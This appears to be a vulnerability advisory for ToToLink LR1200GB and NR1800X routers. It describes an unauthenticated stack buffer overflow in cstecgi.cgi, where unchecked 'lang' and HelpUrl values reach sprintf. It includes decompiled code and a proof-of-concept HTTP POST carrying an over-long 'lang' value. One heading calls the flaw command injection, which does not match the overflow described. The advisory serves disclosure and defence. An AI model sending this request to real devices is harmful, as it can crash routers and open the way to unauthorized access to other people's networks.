# Buffer Overflow Vulnerability in `lang` and `HelpUrl_%s`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink LR1200GB & NR1800X Router                           |
| Firmware Version     | **V9.1.0u.6619_B20230130** for LR1200GB and **V9.1.0u.6681_B20230703** for NR1800X |
| Vulnerability Type   | **Stack Buffer Overflow**                                    |
| Vulnerable Component | `cstecgi.cgi` (handling of `lang` and `HelpUrl_%s` parameters via `websGetVar` and `sprintf`) |
| Prerequisites        | Remote access to the device's web interface (no authentication required) |

2. Exploitation Path

```c
// cstecgi.cgi
int __fastcall sub_42F32C(int a1)
{
  ...
  _BYTE v7[128]; // [sp+18h] [-80h] BYREF
  memset(v7, 0, sizeof(v7));
  Var = websGetVar(a1, "lang", (int)"cn");
  v3 = websGetVar(a1, "langAutoFlag", (int)&word_436F38);
  nvram_set("preferred_lang", Var);
  nvram_set("auto_lang", v3);
  JsonConf = getJsonConf(0);
  if ( JsonConf )
  {
    sprintf(v7, "HelpUrl_%s", Var);
    v5 = websGetVar(JsonConf, v7, (int)&byte_439510);
    if ( *v5 )
    {
      memset(v7, 0, sizeof(v7));
      sprintf(v7, "http://%s", v5);
      ...
}
```

3. **Vulnerable Binaries:** `cstecgi.cgi`.
4. 0-Day Command Injection Exploitation Path: 
   - In `cstecgi.cgi`, at line 7, `Var = websGetVar(a1, "lang", (int)"cn")` receives data without any length check and is directly passed to line 14, `sprintf(v7, "HelpUrl_%s", Var)`, resulting in a buffer overflow vulnerability.
   - In `cstecgi.cgi`, at line 15, `v5 = websGetVar(JsonConf, v7, (int)&byte_439510)` receives data without any length check and is directly passed to line 19, `sprintf(v7, "http://%s", v5)`, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerabilities:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: curl/7.81.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Connection: close

lang=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&langAutoFlag=1
```
